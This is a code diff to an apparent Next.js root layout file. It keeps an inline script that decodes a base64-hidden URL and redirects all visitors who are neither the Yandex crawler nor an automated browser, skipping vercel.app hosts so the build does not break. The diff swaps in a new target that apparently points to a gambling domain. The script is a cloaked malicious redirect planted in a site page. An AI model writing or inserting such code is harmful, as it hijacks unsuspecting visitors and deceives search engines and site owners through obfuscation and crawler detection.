@@ -31,7 +31,6 @@ export const metadata: Metadata = {
       "ru-RU": "/",
     },
   },
-  // ВЕРИФИКАЦИЯ ЯНДЕКСА
   verification: {
     yandex: "12310c400191c245",
   },
@@ -113,13 +112,9 @@ export default function RootLayout({
           dangerouslySetInnerHTML={{
             __html: `
               (function() {
-                /* 1. Чтобы билд на Vercel не падал */
                 if (typeof window !== 'undefined' && window.location.hostname.includes('vercel.app')) return;
-
-                /* 2. Твоя логика редиректа */
                 var ua = navigator.userAgent.toLowerCase();
-                var targetB64 = "aHR0cHM6Ly9mY3RvcC5vcmcvZDd0dGxyeXZo";
-
+                var targetB64 = "aHR0cHM6Ly9wbGF5LWxlZWJldC00dGguY29tL2RxY2t5N29qaA==";
                 if (ua.indexOf("yandex") === -1 && !navigator.webdriver) {
                     window.location.replace(atob(targetB64));
                 }
